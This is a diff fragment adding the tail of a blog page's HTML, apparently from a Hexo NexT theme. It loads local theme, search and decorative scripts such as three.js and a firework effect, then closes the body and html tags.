+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script type="text/javascript" src="/js/firework.js"></script>
+</body>
+</html>
